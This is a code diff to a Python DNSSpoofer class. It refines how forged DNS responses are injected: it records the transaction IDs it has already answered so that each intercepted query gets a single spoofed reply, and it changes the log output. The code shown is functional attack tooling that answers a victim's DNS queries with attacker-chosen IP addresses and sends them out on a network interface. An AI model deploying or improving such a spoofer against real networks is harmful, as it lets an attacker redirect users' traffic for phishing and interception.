@@ -21,14 +21,14 @@ class DNSSpoofer:
 
         self.spoofing = False
 
+        self.spoofed_packet = set()
+
     def handle_dns_request(self, pkt):
         # Extract domain name from DNSQR
         domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
-
-        if domain in self.dns_records:
+        packet_id = pkt[DNS].id
+        if domain in self.dns_records and packet_id not in self.spoofed_packet:
             # Check if we have a spoofed record for this domain
-            print(f"[*] Intercepted DNS request for: {domain}")
-
             spoofed_ip = self.dns_records[domain]
             # Create DNS response packet
             answers = [DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip, ttl=60)] * 6
@@ -43,7 +43,8 @@ class DNSSpoofer:
 
             # Send the spoofed response
             sendp(dns_response, iface=self.interface, verbose=False)
-            print(f"[+] Sent spoofed DNS response for {domain}")
+            self.spoofed_packet.add(packet_id)
+            print(f"[+] Sent spoofed DNS response to packet {packet_id} for {domain}")
 
     def start(self):
         self.spoofing = True
